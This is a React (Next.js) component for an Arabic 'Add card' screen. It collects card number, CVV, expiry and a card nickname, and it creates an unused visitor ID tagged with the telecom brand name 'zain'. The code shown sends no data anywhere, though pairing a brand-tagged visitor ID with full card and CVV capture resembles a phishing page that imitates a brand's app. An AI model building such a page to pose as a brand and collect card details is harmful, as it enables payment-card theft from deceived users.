"use client"

import { useState } from "react"
import { ChevronRight, Facebook, Instagram } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;

export default function AddCardPage() {
  const [cardNumber, setCardNumber] = useState(["", "", "", ""])
  const [cvv, setCvv] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [saveCard, setSaveCard] = useState(false)

  const handleCardNumberChange = (index: number, value: string) => {
    const newCardNumber = [...cardNumber]
    newCardNumber[index] = value.slice(0, 4)
    setCardNumber(newCardNumber)

    // Auto-focus next input if 4 digits entered
    if (value.length === 4 && index < 3) {
      const nextInput = document.getElementById(`card-${index + 1}`)
      nextInput?.focus()
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100" dir="rtl">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-4">
         
          <button className="p-2">
            <ChevronRight className="w-6 h-6" />
          </button>
        </div>
      </div>

      {/* Content */}
      <div className="px-4 py-6 space-y-6">
        {/* Title */}
        <div className="text-center">
          <h1 className="text-xl font-semibold text-gray-800 mb-2">إضافة بطاقة</h1>
          <p className="text-sm text-gray-500">ليتمكن من إضافة المال، ابدأ بإضافة بطاقة</p>
        </div>

        {/* Card Number */}
        <div className="space-y-2">
          <label className="block text-sm text-gray-700 text-right">رقم البطاقة</label>
          <div className="grid grid-cols-4 gap-2">
            {cardNumber.map((value, index) => (
              <Input
                key={index}
                id={`card-${index}`}
                type="text"
                inputMode="numeric"
                placeholder="0000"
                value={value}
                onChange={(e) => handleCardNumberChange(index, e.target.value)}
                className={`text-center h-14 text-lg ${
                  index === 0 ? "border-2 border-purple-400 focus:border-purple-500" : "border-gray-200 bg-gray-50"
                }`}
                maxLength={4}
              />
            ))}
          </div>
        </div>

        {/* CVV and Expiry Date */}
        <div className="grid grid-cols-2 gap-3">
          {/* CVV */}
          <div className="space-y-2">
            <label className="block text-sm text-gray-700 text-right">CVV</label>
            <Input
              type="text"
              inputMode="numeric"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.slice(0, 3))}
              className="text-center h-14 text-lg border-gray-200 bg-gray-50"
              maxLength={3}
            />
          </div>

          {/* Expiry Date */}
          <div className="space-y-2">
            <label className="block text-sm text-gray-700 text-right">تاريخ انتهاء الصلاحية</label>
            <Input
              type="text"
              placeholder="أدخل شهر/عام"
              value={expiry}
              onChange={(e) => setExpiry(e.target.value)}
              className="text-center h-14 text-sm border-gray-200 bg-gray-50"
            />
          </div>
        </div>

        {/* Cardholder Name */}
        <div className="space-y-2">
          <label className="block text-sm text-gray-700 text-right">الإسم المستعار للبطاقة</label>
          <div className="space-y-1">
            <Input
              type="text"
              placeholder="أدخل الإسم المستعار للبطاقة"
              value={cardholderName}
              onChange={(e) => setCardholderName(e.target.value.slice(0, 20))}
              className="h-14 text-sm text-right border-gray-200 bg-gray-50"
              maxLength={20}
            />
            <p className="text-xs text-gray-400">{cardholderName.length}/20</p>
          </div>
        </div>

        {/* Save Card Checkbox */}
        <div className="flex items-center justify-end gap-3 py-2">
          <label htmlFor="save-card" className="text-sm text-gray-700 cursor-pointer">
            إحفظ البطاقة للاستخدام لاحقاً
          </label>
          <Checkbox
            id="save-card"
            checked={saveCard}
            onCheckedChange={(checked) => setSaveCard(checked as boolean)}
            className="border-gray-300"
          />
        </div>
      </div>

      {/* Bottom Button */}
      <div className="fixed bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-white via-white to-transparent">
        <Button className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-purple-500 to-purple-400 hover:from-purple-600 hover:to-purple-500 text-white rounded-xl shadow-lg">
          التالي
        </Button>
      </div>
    </div>
  )
}
